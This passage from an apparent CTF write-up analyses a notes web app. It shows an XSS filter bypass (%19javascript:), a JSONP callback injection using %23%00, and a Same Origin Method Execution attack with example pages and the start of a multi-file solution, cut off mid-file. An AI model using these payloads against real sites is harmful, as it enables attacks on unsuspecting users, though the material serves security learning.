+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">posts</span>.<span style="color:#06b6ef">push</span>(<span style="color:#06b6ef">id</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/post/?id=&#34;</span> <span style="color:#5bc4bf">+</span> <span style="color:#06b6ef">id</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">router</span>.<span style="color:#06b6ef">post</span>(<span style="color:#48b685">&#34;/create/todo&#34;</span>, [<span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">csrfProtection</span>, <span style="color:#06b6ef">mw</span>.<span style="color:#06b6ef">requiresLogin</span>], (<span style="color:#06b6ef">req</span>, <span style="color:#06b6ef">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> { <span style="color:#06b6ef">text</span> } <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">text</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/?msg=Missing text&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">text</span> <span style="color:#5bc4bf">!==</span> <span style="color:#48b685">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span> <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/?msg=Missing text&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">let</span> <span style="color:#06b6ef">isURL</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">new</span> <span style="color:#06b6ef">URL</span>(<span style="color:#06b6ef">text</span>); <span style="color:#776e71">// errors if not valid URL
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#06b6ef">console</span>.<span style="color:#06b6ef">log</span>(<span style="color:#48b685">&#34;first passed&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">isURL</span> <span style="color:#5bc4bf">=</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>().<span style="color:#06b6ef">trim</span>().<span style="color:#06b6ef">startsWith</span>(<span style="color:#48b685">&#34;javascript:&#34;</span>); <span style="color:#776e71">// no
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#06b6ef">console</span>.<span style="color:#06b6ef">log</span>(<span style="color:#48b685">`usUrl:</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">isURL</span><span style="color:#f99b15">}</span><span style="color:#48b685">, &#39;</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>()<span style="color:#f99b15">}</span><span style="color:#48b685">&#39;, &#39;</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>().<span style="color:#06b6ef">trim</span>()<span style="color:#f99b15">}</span><span style="color:#48b685">&#39;`</span>)
+</span></span><span style="display:flex;"><span>    } <span style="color:#815ba4">catch</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">todos</span>.<span style="color:#06b6ef">push</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">text</span>, <span style="color:#06b6ef">isURL</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">res</span>.<span style="color:#06b6ef">redirect</span>(<span style="color:#48b685">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">module</span>.<span style="color:#06b6ef">exports</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">router</span>;
+</span></span></code></pre></div></details>
+<h2 id="exploring-the-app">Exploring the app</h2>
+<p>There isn&rsquo;t a lot of code, so I just started to read it to try to find an interesting functionality.</p>
+<h3 id="todos">TODOs</h3>
+<p>The first thing that caught my eye is the <code>/create/todo</code> endpoint. The function checks whether the note is a valid url:</p>
+<p><code>api.js:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#815ba4">let</span> <span style="color:#06b6ef">isURL</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">false</span>;
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">new</span> <span style="color:#06b6ef">URL</span>(<span style="color:#06b6ef">text</span>); <span style="color:#776e71">// errors if not valid URL
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>    <span style="color:#06b6ef">console</span>.<span style="color:#06b6ef">log</span>(<span style="color:#48b685">&#34;first passed&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">isURL</span> <span style="color:#5bc4bf">=</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>().<span style="color:#06b6ef">trim</span>().<span style="color:#06b6ef">startsWith</span>(<span style="color:#48b685">&#34;javascript:&#34;</span>); <span style="color:#776e71">// no
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>    <span style="color:#06b6ef">console</span>.<span style="color:#06b6ef">log</span>(<span style="color:#48b685">`usUrl:</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">isURL</span><span style="color:#f99b15">}</span><span style="color:#48b685">, &#39;</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>()<span style="color:#f99b15">}</span><span style="color:#48b685">&#39;, &#39;</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>().<span style="color:#06b6ef">trim</span>()<span style="color:#f99b15">}</span><span style="color:#48b685">&#39;`</span>)
+</span></span><span style="display:flex;"><span>} <span style="color:#815ba4">catch</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#06b6ef">req</span>.<span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">todos</span>.<span style="color:#06b6ef">push</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">text</span>, <span style="color:#06b6ef">isURL</span>
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>And later, uses it on the homepage:</p>
+<p><code>home.ejs</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#5bc4bf">&lt;%</span><span style="color:#06b6ef">_</span> <span style="color:#06b6ef">user</span>.<span style="color:#06b6ef">todos</span>.<span style="color:#06b6ef">forEach</span>(<span style="color:#06b6ef">todo</span> =&gt; { <span style="color:#06b6ef">_</span><span style="color:#5bc4bf">%&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;%</span><span style="color:#06b6ef">_</span> <span style="color:#815ba4">if</span> (<span style="color:#06b6ef">todo</span>.<span style="color:#06b6ef">isURL</span>) { <span style="color:#06b6ef">_</span><span style="color:#5bc4bf">%&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">li</span> <span style="color:#815ba4">class</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;has-text-left&#34;</span><span style="color:#5bc4bf">&gt;&lt;</span><span style="color:#06b6ef">a</span> <span style="color:#06b6ef">target</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;_blank&#34;</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=&lt;%=</span> <span style="color:#06b6ef">todo</span>.<span style="color:#06b6ef">text</span> <span style="color:#5bc4bf">%&gt;&gt;&lt;%=</span> <span style="color:#06b6ef">todo</span>.<span style="color:#06b6ef">text</span> <span style="color:#5bc4bf">%&gt;&lt;</span><span style="color:#ef6155">/a&gt;&lt;/li&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;%</span><span style="color:#06b6ef">_</span> } <span style="color:#815ba4">else</span> { <span style="color:#06b6ef">_</span><span style="color:#5bc4bf">%&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;</span><span style="color:#06b6ef">li</span> <span style="color:#815ba4">class</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;has-text-left&#34;</span><span style="color:#5bc4bf">&gt;&lt;%=</span> <span style="color:#06b6ef">todo</span>.<span style="color:#06b6ef">text</span> <span style="color:#5bc4bf">%&gt;&lt;</span><span style="color:#ef6155">/li&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#5bc4bf">&lt;%</span><span style="color:#06b6ef">_</span> } <span style="color:#06b6ef">_</span><span style="color:#5bc4bf">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">&lt;%</span><span style="color:#06b6ef">_</span> }); <span style="color:#06b6ef">_</span><span style="color:#5bc4bf">%&gt;</span>
+</span></span></code></pre></div><p>In a few words, when the todo is a URL &mdash; insert it within the <code>&lt;a&gt;</code> tag.</p>
+<p><code>&lt;a target=&quot;_blank&quot; href=here&gt;</code></p>
+<p>Sure, it has some protections from xss, like checking for a valid url and for the word <code>javascript:</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#06b6ef">isURL</span> <span style="color:#5bc4bf">=</span> <span style="color:#5bc4bf">!</span><span style="color:#06b6ef">text</span>.<span style="color:#06b6ef">toLowerCase</span>().<span style="color:#06b6ef">trim</span>().<span style="color:#06b6ef">startsWith</span>(<span style="color:#48b685">&#34;javascript:&#34;</span>);
+</span></span></code></pre></div><p>But I was able to bypass it with <code>%19javascript:alert()</code>. It still is a valid URL, the <code>trim()</code> removes only whitespaces, and the browsers usually ignore <code>\x01-\x20</code> bytes before <code>javascript:</code>.</p>
+<p>Still, it doesn&rsquo;t help us much because:</p>
+<p>- The tag has <code>target=&quot;_blank</code> attribute.<br>
+- It&rsquo;s a self xss, and the bot cannot create its own todos.<br>
+- The bot doesn&rsquo;t click on anything within the <code>bot.js</code>.</p>
+<p>So I decided to move on.</p>
+<h3 id="callbacks">Callbacks</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#776e71">/**/</span> <span style="color:#815ba4">typeof</span> <span style="color:#06b6ef">load_post</span> <span style="color:#5bc4bf">===</span> <span style="color:#48b685">&#39;function&#39;</span> <span style="color:#5bc4bf">&amp;&amp;</span> <span style="color:#06b6ef">load_post</span>({<span style="color:#48b685">&#34;success&#34;</span><span style="color:#5bc4bf">:</span><span style="color:#815ba4">true</span>,<span style="color:#48b685">&#34;name&#34;</span><span style="color:#5bc4bf">:</span><span style="color:#48b685">&#34;X&#34;</span>,<span style="color:#48b685">&#34;body&#34;</span><span style="color:#5bc4bf">:</span><span style="color:#48b685">&#34;Y&#34;</span>});
+</span></span></code></pre></div><p>The <code>post.ejs</code> file renders a post using the <code>id</code> parameter from the query.
+Within the file, I found a callback:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#06b6ef">onload</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">function</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">const</span> <span style="color:#06b6ef">id</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">new</span> <span style="color:#06b6ef">URLSearchParams</span>(window.<span style="color:#06b6ef">location</span>.<span style="color:#06b6ef">search</span>).<span style="color:#06b6ef">get</span>(<span style="color:#48b685">&#39;id&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> (<span style="color:#5bc4bf">!</span><span style="color:#06b6ef">id</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#776e71">// Load post from POST_SERVER
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>    <span style="color:#776e71">// Since POST_SERVER might be a different origin, this also supports loading data through JSONP
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>    <span style="color:#815ba4">const</span> <span style="color:#06b6ef">request</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">new</span> <span style="color:#06b6ef">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">request</span>.<span style="color:#06b6ef">open</span>(<span style="color:#48b685">&#39;GET&#39;</span>, <span style="color:#06b6ef">POST_SERVER</span> <span style="color:#5bc4bf">+</span> <span style="color:#48b685">`/api/post/`</span> <span style="color:#5bc4bf">+</span> encodeURIComponent(<span style="color:#06b6ef">id</span>), <span style="color:#815ba4">false</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">request</span>.<span style="color:#06b6ef">send</span>(<span style="color:#815ba4">null</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">catch</span> (<span style="color:#06b6ef">err</span>) { <span style="color:#776e71">// POST_SERVER is on another origin, so let&#39;s use JSONP
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>        <span style="color:#815ba4">let</span> <span style="color:#06b6ef">script</span> <span style="color:#5bc4bf">=</span> document.<span style="color:#06b6ef">createElement</span>(<span style="color:#48b685">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">script</span>.<span style="color:#06b6ef">src</span> <span style="color:#5bc4bf">=</span> <span style="color:#48b685">`</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">POST_SERVER</span><span style="color:#f99b15">}</span><span style="color:#48b685">/api/post/</span><span style="color:#f99b15">${</span><span style="color:#06b6ef">id</span><span style="color:#f99b15">}</span><span style="color:#48b685">?callback=load_post`</span>;
+</span></span><span style="display:flex;"><span>        document.<span style="color:#06b6ef">head</span>.<span style="color:#06b6ef">appendChild</span>(<span style="color:#06b6ef">script</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">load_post</span>(<span style="color:#06b6ef">JSON</span>.<span style="color:#06b6ef">parse</span>(<span style="color:#06b6ef">request</span>.<span style="color:#06b6ef">responseText</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><em>BTW, <code>POST_SERVER</code> is never used, and everything is on the same host.</em></p>
+<p>From the Intigriti <a href="https://youtu.be/EZfPrgrV5p4">xss challenge</a>, I know about the <strong>Same Origin Method Execution</strong> attack that exploits callbacks. This attack will be covered later in the <a href="#some-attack">SOME attack</a> chapter.</p>
+<p>To use the callback, we need to go to the <code>catch</code> block of the script. From the <a href="https://xhr.spec.whatwg.org/#the-open()-method">documentation</a> of the xhr <code>open()</code> method, we can see possible exceptions that can lead us to the <code>catch</code> block:</p>
+<blockquote>
+<p>Throws a &ldquo;SyntaxError&rdquo; DOMException if either method is not a valid method or <strong>url</strong> cannot be parsed.<br>
+Throws a &ldquo;SecurityError&rdquo; DOMException if method is a case-insensitive match for <code>CONNECT</code>, <code>TRACE</code>, or <code>TRACK</code>.<br>
+Throws an &ldquo;InvalidAccessError&rdquo; DOMException if async is false, the current global object is a Window object, and the timeout attribute is not zero or the responseType attribute is not the empty string.</p>
+</blockquote>
+<p>The only thing that we can modify is the <strong>url</strong> because we control <code>encodeURIComponent(id)</code>.</p>
+<p>I did some fuzzing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#776e71">// try several different characters with codes from 0 to 1000
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span><span style="color:#815ba4">for</span>(<span style="color:#06b6ef">i</span><span style="color:#5bc4bf">=</span><span style="color:#f99b15">0</span>; <span style="color:#06b6ef">i</span><span style="color:#5bc4bf">&lt;</span><span style="color:#f99b15">1000</span>; <span style="color:#06b6ef">i</span><span style="color:#5bc4bf">++</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">const</span> <span style="color:#06b6ef">request</span> <span style="color:#5bc4bf">=</span> <span style="color:#815ba4">new</span> <span style="color:#06b6ef">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">request</span>.<span style="color:#06b6ef">open</span>(<span style="color:#48b685">&#39;GET&#39;</span>, <span style="color:#48b685">`/api/post/`</span> <span style="color:#5bc4bf">+</span> encodeURIComponent(String.<span style="color:#06b6ef">fromCharCode</span>(<span style="color:#06b6ef">i</span>)), <span style="color:#815ba4">false</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#06b6ef">request</span>.<span style="color:#06b6ef">send</span>(<span style="color:#815ba4">null</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#815ba4">catch</span> (<span style="color:#06b6ef">err</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#06b6ef">console</span>.<span style="color:#06b6ef">log</span>(<span style="color:#48b685">&#34;ERROR :&#34;</span>, <span style="color:#06b6ef">i</span>,  <span style="color:#06b6ef">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And discovered that chromium <em>(headless chromium is used in the task)</em> throws an error if <code>%00</code> is somewhere within the url.</p>
+<p>So with something like <code>/post/?id={id}%00</code>, we can fall into the <code>catch</code> block. The only thing is &mdash; <code>{id}%00</code> is later added to the script src. Script src does not execute with <code>%00</code> as well, but I discovered that one can bypass it with a <code>#</code> character. <code>/api/post/%23%00</code> will throw an error <em>(it&rsquo;s %23 because encodeURIComponent is used in the <code>try{}</code> block)</em>, but <code>/api/post/#%00</code> will not.</p>
+<p>The final url with a custom callback will look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>http:<span style="color:#5bc4bf">//</span>localhost:<span style="color:#f99b15">12345</span><span style="color:#5bc4bf">/</span>post<span style="color:#5bc4bf">/</span><span style="color:#ef6155">?</span>id<span style="color:#5bc4bf">=</span>{valid_id}<span style="color:#ef6155">?</span>callback<span style="color:#5bc4bf">=</span>our_function<span style="color:#5bc4bf">%</span><span style="color:#f99b15">23</span><span style="color:#5bc4bf">%</span><span style="color:#f99b15">00</span>
+</span></span></code></pre></div><p>With it, <code>/api/post/${id}?callback=load_post</code> transforms to <code>/api/post/{valid_id}?callback=our_function#%00?callback=load_post</code>, and the following callback script is added to the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">script</span> <span style="color:#06b6ef">src</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">/api/post/{valid_id}?callback=our_function#%00?callback=load_post</span>&gt;&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span></code></pre></div><p>During the request, only <code>/api/post/{valid_id}?callback=our_function</code> part is sent to the server, so we can execute arbitrary functions within the page.</p>
+<h2 id="some-attack">SOME attack</h2>
+<p>You can read about it <a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">here</a>.</p>
+<p>With this attack, it&rsquo;s possible to execute js methods in the context of different documents within the same origin.</p>
+<p><em><strong>Example</strong>: By using this attack <code>https://example.com/vulnerable</code> can execute js methods on <code>https://example.com/anything</code>.</em></p>
+<blockquote>
+<p>Such method execution includes: clicks, form submissions, form input value tampering, JavaScript functions and similar (e.g. element.click(), privateForm.submit(), inputElement.stepUp/stepDown(), element.select(), element.focus(), JsDefinedFunction(), jQueryFunc() and so on.</p>
+</blockquote>
+<h3 id="example">Example</h3>
+<p>To help you understand the attack without reading the long article above, I will add a simple example of the attack.</p>
+<p>Let&rsquo;s say we have three pages:</p>
+<p><code>http://victim.com/endpoint?callback=something</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#776e71">/**/</span><span style="color:#06b6ef">something</span>({<span style="color:#48b685">&#34;data&#34;</span><span style="color:#5bc4bf">:</span><span style="color:#48b685">&#34;data&#34;</span>})
+</span></span></code></pre></div><p>The endpoint with the callback.</p>
+<p><code>http://victim.com/proxy?name=something</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#5bc4bf">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#5bc4bf">script</span> <span style="color:#06b6ef">src</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;/endpoint?callback=something&#39;</span>&gt;&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#5bc4bf">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
+</span></span></code></pre></div><p>The page with a script tag pointed to the callback.</p>
+<p><code>http://victim.com/link?url=javascript:alert()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#5bc4bf">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#5bc4bf">a</span> <span style="color:#06b6ef">href</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;javascript:alert()&#34;</span>&gt;&lt;/<span style="color:#5bc4bf">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#5bc4bf">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
+</span></span></code></pre></div><p>The page where we want to use a js method.</p>
+<p>Using the SOME attack we can call <code>.click()</code> on the <code>&lt;a&gt;</code> tag of the last page without any user interactions! To do so, we need to create two pages:</p>
+<p><code>start.html:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">win1</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">open</span>(<span style="color:#48b685">&#34;/click.html&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">location</span>.<span style="color:#06b6ef">replace</span>(<span style="color:#48b685">&#34;http://victim.com/link?url=javascript:alert()&#34;</span>)
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span></code></pre></div><p><code>win1.html:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#776e71">// wait for start.html to redirect
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>    <span style="color:#06b6ef">setTimeout</span>(<span style="color:#48b685">`location.replace(&#34;http://victim.com/proxy?name=opener.document.body.children[0].click&#34;)`</span>, <span style="color:#f99b15">1000</span>)
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span></code></pre></div><p>First of all, <code>start.html</code> creates another page &mdash; <code>win1.html</code>. Now, <code>win1.html</code> can refer to <code>start.html</code> using the <code>opener</code> property. If we redirect both pages to another origin we can still access <code>http://victim.com/link</code><em>(previous <code>start.html</code>)</em> via <code>http://victim.com/proxy</code><em>(previous <code>win1.html</code>)</em> using <code>opener</code>. Now <code>http://victim.com/proxy</code> can execute a callback script on behalf of <code>http://victim.com/link</code> using the <code>opener</code> property and therefore execute an alert without any clicks.</p>
+<p><strong>detailed explanation</strong></p>
+<p>After the redirection, <code>win1.html</code> has the location of <code>http://victim.com/proxy?name=opener.document.body.children[0].click</code> and the following body:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#5bc4bf">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#5bc4bf">script</span> <span style="color:#06b6ef">src</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#39;/endpoint?callback=opener.document.body.children[0].click&#39;</span>&gt;&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#5bc4bf">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">html</span>&gt;
+</span></span></code></pre></div><p>The <code>&lt;script src=/endpoint?callback=..&gt;&lt;/script&gt;</code> tag executes the <code>document.body.children[0].click()</code> function within the <code>opener</code> of <code>win1</code>. The <code>opener</code> of <code>win1</code> is <code>http://victim.com/link?url=javascript:alert()</code> <em>(because <code>start.html</code> got redirected there)</em>, and therefore <code>document.body.children[0].click()</code> is executed within <code>http://victim.com/link?url=javascript:alert()</code>. <code>children[0]</code> body element is our <code>&lt;a href&gt;</code> tag with a payload.</p>
+<h3 id="solution">Solution</h3>
+<p>Using the abovementioned attack, we can execute js methods on the document with the admin post id.</p>
+<p>To save some time, I decided to use <strong>IcesFont#1629&rsquo;s</strong> solution of the hitcon 2022 secure paste challenge as a base for my solution. The problems are quite similar. With secure paste&rsquo;s case, there&rsquo;s a secret id within the url, not the page itself. You can find his solution on the hitcon discord server.</p>
+<p>The solution consists of 4 files.</p>
+<p>The first one opens another page and redirects itself to the challenge homepage:</p>
+<p><code>a.html:</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">b</span> <span style="color:#5bc4bf">=</span> <span style="color:#06b6ef">open</span>(<span style="color:#48b685">`/b.html`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#06b6ef">location</span>.<span style="color:#06b6ef">replace</span>(<span style="color:#48b685">&#34;http://localhost:12345/&#34;</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#5bc4bf">script</span>&gt;
+</span></span></code></pre></div><p>The second one creates iframes for every character to detect the onfocus event that can be called via callback:</p>
+<p><code>b.html</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#5bc4bf">body</span>&gt;
